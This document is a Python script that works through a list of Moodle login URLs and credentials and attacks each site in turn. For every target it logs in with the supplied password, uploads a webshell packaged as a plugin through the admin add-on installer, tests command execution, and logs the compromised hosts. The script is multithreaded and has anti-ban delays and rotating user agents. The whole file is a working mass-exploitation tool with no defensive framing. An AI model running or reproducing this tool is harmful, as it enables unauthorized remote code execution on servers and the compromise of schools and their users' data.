import requests, os, threading, argparse, time, random
from urllib.parse import urljoin
from queue import Queue

lock = threading.Lock()
q = Queue()

headers_list = [
    {"User-Agent": "Mozilla/5.0"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
]

def login(session, login_url, username, password):
    try:
        r = session.get(login_url, timeout=15, headers=random.choice(headers_list), verify=False)
        token = r.text.split('logintoken" value="')[1].split('"')[0]
        data = {
            "username": username,
            "password": password,
            "logintoken": token
        }
        r = session.post(login_url, data=data, headers=random.choice(headers_list), timeout=15, verify=False)
        return "dashboard" in r.url or "loginsuccess" in r.text
    except:
        return False

def upload_shell(session, base_url):
    try:
        upload_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
        files = {
            'repo_upload_file': ('moodle_webshell.zip', open('moodle_webshell.zip', 'rb'), 'application/zip')
        }
        session.get(upload_url, headers=random.choice(headers_list), timeout=15)
        r = session.post(upload_url, files=files, headers=random.choice(headers_list), timeout=15)
        return "Plugin installed" in r.text or "successfully installed" in r.text
    except:
        return False

def exec_test(session, base_url):
    try:
        test_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
        r = session.get(test_url, headers=random.choice(headers_list), timeout=15)
        return "uid=" in r.text
    except:
        return False

def process(target):
    try:
        url, user, pwd = target.strip().split("|")
        base_url = url.split("/login")[0]
        session = requests.Session()

        result = []

        if login(session, url, user, pwd):
            result.append(f"1.Login success ✅ {url}|{user}|{pwd}")

            if upload_shell(session, base_url):
                shell_url = f"{base_url}/local/moodle_webshell/webshell.php"
                result.append(f"2.Upload webshell ✅ {shell_url}")

                access_url = f"{shell_url}?action=exec&cmd=id"
                if exec_test(session, base_url):
                    result.append(f"3.Access: {access_url}")
                    result.append("4.Result: ✅ Webshell OK")
                    save_result("success.txt", result)
                else:
                    result.append("3.Access Failed ❌")
                    save_result("partial.txt", result)
            else:
                result.append("2.Upload Failed ❌")
                result.append("3.No Webshell")
                result.append("4.Only login success.")
                save_result("only_login.txt", result)
        else:
            result.append(f"4.❌ Login Failed: {url}")
            save_result("failed.txt", result)
    except Exception as e:
        save_result("error.txt", [f"[ERROR] {target} -> {str(e)}"])

def save_result(filename, lines):
    with lock:
        with open(filename, "a") as f:
            f.write("\n".join(lines) + "\n" + "-"*40 + "\n")

def worker():
    while not q.empty():
        target = q.get()
        process(target)
        time.sleep(random.uniform(2, 5))  # anti ban
        q.task_done()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--list', help='File list target')
    parser.add_argument('--thread', type=int, default=5)
    args = parser.parse_args()

    with open(args.list, 'r') as f:
        for line in f:
            q.put(line.strip())

    threads = []
    for _ in range(args.thread):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
